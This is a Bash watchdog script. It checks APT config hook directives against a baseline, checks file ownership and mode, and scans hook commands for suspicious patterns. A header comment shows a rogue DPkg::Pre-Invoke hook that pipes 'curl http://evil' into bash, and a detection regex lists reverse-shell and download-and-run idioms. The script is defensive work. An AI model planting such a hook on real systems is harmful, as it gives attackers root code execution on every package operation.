#!/usr/bin/env bash
# selfdef apt-hooks-watchdog — boot + daily delta of the APT config
# hook directives vs a learned baseline + ownership + command scan.
#
# APT runs hook directives AS ROOT on every apt/dpkg operation:
#   DPkg::Pre-Invoke / DPkg::Post-Invoke / DPkg::Pre-Install-Pkgs
#   APT::Update::Pre-Invoke / Post-Invoke / Post-Invoke-Success
# A rogue hook fires on the next package install/update (T1546):
#
#   DPkg::Pre-Invoke {"curl -s http://evil | bash";};   # root, on apt install
#
# Records (each line: kind<TAB>key<TAB>value):
#   file:<path>:<sha12>      — hash of each apt.conf file
#   own:<path>:<owner:mode>  — owner + mode
#   hook:<directive>:<cmd0>  — each hook's command (first token)
#
# Severity:
#   ok    → no delta
#   warn  → a hook / file added, removed, or changed
#   alert → a hook command under /tmp /home /dev/shm, world-writable,
#           or bare/relative; an injection pattern; or a
#           world-writable/non-root apt.conf

set -u

PROFILE="${SELFDEF_APTHOOK_PROFILE:-report}"
BASELINE="${SELFDEF_APTHOOK_BASELINE:-/var/lib/selfdef/apt-hooks-baseline.tsv}"
APTCONF="${SELFDEF_APTHOOK_FILE:-/etc/apt/apt.conf}"
APTCONFD="${SELFDEF_APTHOOK_D:-/etc/apt/apt.conf.d}"

HOOK_RE='(DPkg::(Pre|Post)-Invoke|DPkg::Pre-Install-Pkgs|APT::Update::(Pre|Post)-Invoke(-Success)?)'
PATTERNS='curl[^|;&]*\|[[:space:]]*(ba)?sh|wget[^|;&]*\|[[:space:]]*(ba)?sh|/dev/tcp/|bash[[:space:]]+-i|base64[[:space:]]+-d|mkfifo'

is_suspicious_cmd() {
    local p="$1"
    case "$p" in
        /tmp/*|/tmp|/var/tmp*|/dev/shm*|/home/*) return 0 ;;
        /*) [[ -e "$p" && "$(stat -L -c '%a' "$p" 2>/dev/null)" =~ [2367]$ ]] && return 0
            return 1 ;;
        ""|true|false|/bin/true|/bin/false) return 1 ;;
        ./*|../*|*/*) return 0 ;;
        *) return 1 ;;   # bare command (test, dpkg, …) — normal in apt hooks
    esac
}

files=()
[[ -f "$APTCONF" ]] && files+=("$APTCONF")
if [[ -d "$APTCONFD" ]]; then
    for f in "$APTCONFD"/*; do [[ -f "$f" ]] && files+=("$f"); done
fi

if [[ ${#files[@]} -eq 0 ]]; then
    logger -t selfdef-apt-hooks -- '{"tag":"selfdef-apt-hooks","severity":"ok","event":"no_apt_config","profile":"'"$PROFILE"'"}'
    exit 0
fi

current="$(mktemp)"
trap 'rm -f "$current" "${current}.sorted"' EXIT

declare -a suspicious=()

for f in "${files[@]}"; do
    h=$(sha256sum "$f" 2>/dev/null | awk '{print substr($1,1,12)}')
    printf 'file\t%s\t%s\n' "$f" "$h" >> "$current"
    owner=$(stat -c '%U' "$f" 2>/dev/null || echo '?')
    mode=$(stat -c '%a' "$f" 2>/dev/null || echo '?')
    printf 'own\t%s\t%s\n' "$f" "${owner}:${mode}" >> "$current"
    if [[ "$mode" =~ [2367]$ ]]; then
        suspicious+=("$(basename "$f"):world-writable($mode)")
    elif [[ "$owner" != "root" && "$owner" != "?" ]]; then
        suspicious+=("$(basename "$f"):owned-by-$owner")
    fi
    # Extract hook directive + the first quoted command on the line.
    while IFS= read -r m; do
        directive=$(printf '%s' "$m" | grep -oiE "$HOOK_RE" | head -1)
        cmd=$(printf '%s' "$m" | grep -oE '"[^"]*"' | head -1 | sed -e 's/^"//' -e 's/"$//')
        prog="${cmd%% *}"
        printf 'hook\t%s\t%s\n' "$directive" "${prog:-(none)}" >> "$current"
        [[ -n "$prog" ]] && is_suspicious_cmd "$prog" && suspicious+=("${directive}=>${prog}")
        printf '%s\n' "$cmd" | grep -qE "$PATTERNS" && suspicious+=("${directive}-payload")
    done < <(grep -iE "$HOOK_RE[^\"]*\"" "$f" 2>/dev/null)
done

{ sort -u > "${current}.sorted"; } < "$current" && mv "${current}.sorted" "$current"
cur_count=$(wc -l < "$current" | tr -d ' ')

if (( ${#suspicious[@]} > 0 )); then
    mapfile -t suspicious < <(printf '%s\n' "${suspicious[@]}" | sort -u)
fi

if [[ ! -f "$BASELINE" ]]; then
    mkdir -p "$(dirname "$BASELINE")"
    cp "$current" "$BASELINE"
    chmod 0600 "$BASELINE"
    susp_str=$(IFS='|'; echo "${suspicious[*]:-}")
    sev="ok"; [[ ${#suspicious[@]} -gt 0 ]] && sev="alert"
    logger -t selfdef-apt-hooks -- "$(printf '{"tag":"selfdef-apt-hooks","severity":"%s","event":"baseline_initial","profile":"%s","entries":%d,"suspicious":"%s"}' "$sev" "$PROFILE" "$cur_count" "$susp_str")"
    [[ "$PROFILE" == "enforce" && "$sev" != "ok" ]] && exit 1
    exit 0
fi

added=$(comm -23 "$current" <(sort -u "$BASELINE"))
removed=$(comm -13 "$current" <(sort -u "$BASELINE"))
n_added=$(printf '%s' "$added"   | grep -c . || true)
n_removed=$(printf '%s' "$removed" | grep -c . || true)

severity="ok"; event="apt_hooks_intact"
if (( ${#suspicious[@]} > 0 )); then
    severity="alert"; event="apt_hooks_suspicious"
elif (( n_added > 0 || n_removed > 0 )); then
    severity="warn"; event="apt_hooks_changed"
fi

added_sample=$(printf '%s' "$added"   | awk -F'\t' '{print $1":"$2":"$3}' | head -8 | tr '\n' '|')
removed_sample=$(printf '%s' "$removed" | awk -F'\t' '{print $1":"$2":"$3}' | head -8 | tr '\n' '|')
susp_str=$(IFS='|'; echo "${suspicious[*]:-}")

json=$(printf '{"tag":"selfdef-apt-hooks","severity":"%s","event":"%s","profile":"%s","added":%d,"removed":%d,"suspicious":"%s","added_sample":"%s","removed_sample":"%s"}' \
    "$severity" "$event" "$PROFILE" "$n_added" "$n_removed" "$susp_str" "$added_sample" "$removed_sample")
logger -t selfdef-apt-hooks -- "$json"

[[ -n "$added" ]]   && printf '%s\n' "$added"   | while IFS=$'\t' read -r k p v; do [[ -n "$k" ]] && logger -t selfdef-apt-hooks-detail -- "ADDED ${k} ${p} ${v}"; done
[[ -n "$removed" ]] && printf '%s\n' "$removed" | while IFS=$'\t' read -r k p v; do [[ -n "$k" ]] && logger -t selfdef-apt-hooks-detail -- "REMOVED ${k} ${p} ${v}"; done

cp "$current" "$BASELINE" 2>/dev/null || true

if [[ "$PROFILE" == "enforce" && "$severity" != "ok" ]]; then
    exit 1
fi
exit 0
